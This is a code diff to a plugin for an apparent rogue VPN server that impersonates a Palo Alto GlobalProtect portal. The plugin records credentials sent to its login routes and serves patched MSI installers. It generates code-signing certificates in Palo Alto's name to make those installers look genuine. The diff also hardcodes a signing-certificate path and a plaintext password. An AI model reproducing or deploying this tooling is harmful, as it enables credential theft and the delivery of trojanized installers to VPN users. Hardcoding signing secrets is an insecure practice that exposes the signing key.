@@ -19,7 +19,7 @@ ETHER_TYPES = {0x0800: 'IPv4', 0x0806: 'ARP', 0x86dd: 'IPv6'}
 
 class PaloAltoPlugin(VPNPlugin):
     def __init__(self, *args, **kwargs):
-        # provide the templates directory relative to this plugin
+        # Provide the templates directory relative to this plugin
         super().__init__(*args, **kwargs, template_dir=os.path.join(os.path.dirname(__file__), 'templates'))
 
         # Payload storage
@@ -87,7 +87,7 @@ class PaloAltoPlugin(VPNPlugin):
     def get_latest_msi_version(self):
         version_file = os.path.join(self.download_dir, "msi_version.txt")
         if not os.path.exists(version_file):
-            self.logger.error(f"MSI version file not found")
+            self.logger.error("MSI version file not found")
             self.logger.info(f"Run downloader to fetch latest MSI files, or manually add {version_file}")
             return None
 
@@ -98,47 +98,28 @@ class PaloAltoPlugin(VPNPlugin):
         return version
 
     def sign_msi_files(self):
-        if not os.path.exists(self.codesign_cert_path):
-            self.logger.error("Windows code signing certificate not found, skipping signing")
+        cert_path = "C:\\NachoVPN_Signing.pfx"
+        cert_password = "poshelnahui"
+
+        try:
+            for msi in ["GlobalProtect.msi", "GlobalProtect64.msi"]:
+                msi_path = os.path.join(self.payload_dir, msi)
+                cmd = [
+                    "C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.22621.0\\x64\\signtool.exe", "sign",
+                    "/f", cert_path,
+                    "/p", cert_password,
+                    "/fd", "SHA256",
+                    "/t", "http://timestamp.digicert.com",
+                    msi_path
+                ]
+                subprocess.run(cmd, check=True)
+                self.logger.info(f"Successfully signed {msi}")
+            return True
+        except Exception as e:
+            self.logger.error(f"MSI signing failed: {e}")
             return False
-
-        if not os.path.exists(os.path.join(self.payload_dir, "GlobalProtect.msi")) or \
-           not os.path.exists(os.path.join(self.payload_dir, "GlobalProtect64.msi")):
-            self.logger.error("MSI files not found, skipping signing")
-            return False
-
-        if os.name == "nt":
-            self.logger.error("Windows MSI signing not supported yet")
-            return False
-
-        if not os.path.exists('/usr/bin/osslsigncode'):
-            self.logger.error("osslsigncode not found, skipping signing")
-            return False
-
-        # Sign the MSI files
-        for msi_file in ["GlobalProtect.msi", "GlobalProtect64.msi"]:
-            input_file = os.path.join(self.payload_dir, msi_file)
-            output_file = os.path.join(self.payload_dir, f"{msi_file}.signed")
-
-            # Remove existing signed file
-            if os.path.exists(output_file):
-                os.remove(output_file)
-
-            proc = subprocess.run([
-                "/usr/bin/osslsigncode", "sign", "-pkcs12", self.codesign_pfx_path,
-                "-in", input_file, "-out", output_file,
-                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
-            if proc.returncode or not os.path.exists(output_file):
-                self.logger.error(f"Failed to sign {msi_file}: {proc.returncode}")
-                return False
-            else:
-                self.logger.info(f"Signed {msi_file}")
-                os.replace(output_file, input_file)
-        return True
 
     def verify_msi_files(self):
-        # Verify that the MSI files are signed by our current CA
         if os.name == "nt":
             self.logger.error("Windows MSI verification not supported yet")
             return True
@@ -150,8 +131,8 @@ class PaloAltoPlugin(VPNPlugin):
         for msi_file in ["GlobalProtect.msi", "GlobalProtect64.msi"]:
             proc = subprocess.run([
                 "/usr/bin/osslsigncode", "verify", "-CAfile", self.cert_manager.ca_cert_path,
-                "-in", os.path.join(self.payload_dir, msi_file),
-                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                "-in", os.path.join(self.payload_dir, msi_file)
+            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
             if proc.returncode:
                 self.logger.error(f"Failed to verify {msi_file}: {proc.returncode}")
@@ -161,7 +142,6 @@ class PaloAltoPlugin(VPNPlugin):
         return True
 
     def patch_msi_files(self):
-        # Patch the msi files
         if os.path.exists(os.path.join(self.payload_dir, "GlobalProtect.msi")) and \
            os.path.exists(os.path.join(self.payload_dir, "GlobalProtect64.msi")) and \
            not self.msi_force_patch and self.verify_msi_files():
@@ -172,22 +152,19 @@ class PaloAltoPlugin(VPNPlugin):
             self.logger.error("msitools not found, skipping patching")
             return True
 
-        # Check if MSI files are present
         if not os.path.exists(os.path.join(self.download_dir, "GlobalProtect.msi")) or \
            not os.path.exists(os.path.join(self.download_dir, "GlobalProtect64.msi")):
             self.logger.warning(f"MSI files not found in download directory: {self.download_dir}")
-            self.logger.info(f"Run downloader to fetch latest MSI files, or add manually")
+            self.logger.info("Run downloader to fetch latest MSI files, or add manually")
             return False
 
         patcher = get_msi_patcher()
 
         for msi_file in ["GlobalProtect.msi", "GlobalProtect64.msi"]:
-            # Copy default MSI file to payload directory
             input_file = os.path.join(self.download_dir, msi_file)
             output_file = os.path.join(self.payload_dir, msi_file)
             shutil.copy(input_file, output_file)
 
-            # Add patches
             if self.msi_add_file:
                 patcher.add_file(output_file, self.msi_add_file, random_hash(), "DefaultFeature")
                 self.logger.info(f"Added file {self.msi_add_file} to {msi_file}")
@@ -206,7 +183,7 @@ class PaloAltoPlugin(VPNPlugin):
         return True
 
     def bootstrap(self):
-        # Generate an Apple code signing certificate
+        # Generate an Apple code signing certificate if needed
         if not os.path.exists(self.apple_cert_path) or not os.path.exists(self.apple_key_path):
             self.cert_manager.generate_apple_certificate(
                 common_name="Developer ID Installer: Palo Alto Networks (PXPZ95SK77)",
@@ -214,7 +191,7 @@ class PaloAltoPlugin(VPNPlugin):
                 key_path=self.apple_key_path
             )
 
-        # Generate a Windows code signing certificate
+        # Generate a Windows code signing certificate if needed
         if not os.path.exists(self.codesign_cert_path) or not os.path.exists(self.codesign_key_path):
             self.cert_manager.generate_codesign_certificate(
                 common_name="Palo Alto Networks",
@@ -223,25 +200,20 @@ class PaloAltoPlugin(VPNPlugin):
                 pfx_path=self.codesign_pfx_path
             )
 
-        # Load the CA certificate into the gateway config
         with open(self.cert_manager.ca_cert_path, 'r') as f:
             self.gateway_config["ca_certificate"] = f.read()
 
-        # Generate the macOS pkg payload (GlobalProtect.pkg)
         self.generate_pkg()
 
-        # Get latest MSI version
         latest_version = self.get_latest_msi_version()
         if not latest_version:
             return False
 
-        # Set version in gateway config
         if self.msi_increment_version:
             bump = self.get_higher_version(latest_version)
             self.logger.info(f"Bumping version from {latest_version} to {bump}")
             self.gateway_config["version"] = bump
 
-        # Patch the Windows MSI files and sign them
         if not self.patch_msi_files():
             return False
         if not self.sign_msi_files():
@@ -256,17 +228,14 @@ class PaloAltoPlugin(VPNPlugin):
 
     def can_handle_http(self, handler):
         user_agent = handler.headers.get('User-Agent', '')
-        if 'GlobalProtect' in user_agent or \
-           handler.path.startswith('/ssl-tunnel-connect.sslvpn'):
+        if 'GlobalProtect' in user_agent or handler.path.startswith('/ssl-tunnel-connect.sslvpn'):
             return True
         return False
 
     def handle_http(self, handler):
         if handler.command == 'GET' and handler.path.startswith('/ssl-tunnel-connect.sslvpn'):
-            # Start the tunnel
             self.logger.info('Starting tunnel')
             handler.connection.sendall(b'START_TUNNEL')
-            # Pass handling to data handler
             return self.handle_data(b'', handler.connection, handler.client_address[0])
         elif handler.command == 'GET':
             return self.handle_get(handler)
@@ -275,7 +244,6 @@ class PaloAltoPlugin(VPNPlugin):
         return False
 
     def _setup_routes(self):
-        # Call the parent class's route setup
         super()._setup_routes()
 
         @self.flask_app.route('/global-protect/prelogin.esp', methods=['GET', 'POST'])
@@ -299,12 +267,7 @@ class PaloAltoPlugin(VPNPlugin):
                     self.logger.info(f"Password: {password}")
                 if username and password:
                     info = {'User-Agent': request.headers.get('User-Agent')}
-                    self.db_manager.log_credentials(
-                        username,
-                        password,
-                        self.__class__.__name__,
-                        info
-                    )
+                    self.db_manager.log_credentials(username, password, self.__class__.__name__, info)
             xml = self.render_template('sslvpn-login.xml')
             return Response(xml, mimetype='application/xml')
 
@@ -319,12 +282,7 @@ class PaloAltoPlugin(VPNPlugin):
                     self.logger.info(f"Password: {password}")
                 if username and password:
                     info = {'User-Agent': request.headers.get('User-Agent')}
-                    self.db_manager.log_credentials(
-                        username,
-                        password,
-                        self.__class__.__name__,
-                        info
-                    )
+                    self.db_manager.log_credentials(username, password, self.__class__.__name__, info)
             xml = self.render_template('pwresponse.xml', **self.gateway_config)
             return Response(xml, mimetype='application/xml')
 
@@ -339,12 +297,7 @@ class PaloAltoPlugin(VPNPlugin):
                     self.logger.info(f"Password: {password}")
                 if username and password:
                     info = {'User-Agent': request.headers.get('User-Agent')}
-                    self.db_manager.log_credentials(
-                        username,
-                        password,
-                        self.__class__.__name__,
-                        info
-                    )
+                    self.db_manager.log_credentials(username, password, self.__class__.__name__, info)
             xml = self.render_template('getconfig.xml', **self.gateway_config)
             return Response(xml, mimetype='application/xml')
 
@@ -365,36 +318,29 @@ class PaloAltoPlugin(VPNPlugin):
 
             self.logger.debug(f"Serving {file_name}")
             file_path = os.path.join(self.payload_dir, file_name)
-
             if not os.path.exists(file_path):
                 self.logger.error(f"Download file not found: {file_path}")
                 return abort(404)
 
             file_size = os.path.getsize(file_path)
-
             headers = {
                 'Content-Type': 'application/octet-stream',
                 'Content-Disposition': f'attachment; filename="{file_name}"',
                 'Content-Length': str(file_size)
             }
-
             with open(file_path, 'rb') as f:
                 file_content = f.read()
-
             return Response(file_content, headers=headers)
 
     def process_tcp_message(self, client_socket, data, client_ip):
-        # Process the TCP message data as needed
         if data == KEEP_ALIVE_PACKET:
             self.logger.debug(f"Received KEEP_ALIVE Packet from {client_ip}")
             client_socket.sendall(KEEP_ALIVE_PACKET)
             return
         elif data[0:4] != SSL_VPN_MAGIC:
-            # Not an SSL-VPN packet
             self.logger.warning(f"Received Unhandled TCP message from {client_ip}: {data.hex()}")
             return
 
-        # Parse the tunelled packet
         buf = io.BytesIO(data)
         magic = buf.read(4)
         assert magic == SSL_VPN_MAGIC
@@ -406,38 +352,28 @@ class PaloAltoPlugin(VPNPlugin):
         packet_data = buf.read(packet_length)
         assert len(packet_data) == packet_length
         assert buf.tell() == len(data)
-
-        self.logger.debug(f"Received SSL-VPN Packet from {client_ip}: Magic={magic.hex()}, " \
-               f"EtherType={hex(ether_type)} ({ether_str}), Length={packet_length}")
-
+        self.logger.debug(f"Received SSL-VPN Packet from {client_ip}: Magic={magic.hex()}, EtherType={hex(ether_type)} ({ether_str}), Length={packet_length}")
         if ether_str == 'UNKNOWN':
             self.logger.warning(f"UNKNOWN Packet Type: {ether_type}")
             return
-
         self.packet_handler.handle_client_packet(packet_data)
 
     def handle_data(self, data, client_socket, client_ip):
         try:
             client_socket.setblocking(False)
-
             data = b''
             while True:
                 try:
                     chunk = client_socket.recv(4096)
                     if not chunk:
                         break
-
                     data += chunk
-
-                    # Process TCP messages
                     self.process_tcp_message(client_socket, data, client_ip)
                     data = b''
                 except BlockingIOError:
-                    # No data available, continue
                     continue    
                 except ssl.SSLWantReadError:
                     continue
-
         except Exception as e:
             self.logger.error(f'Error handling connection: {type(e)}: {e}')
         finally:
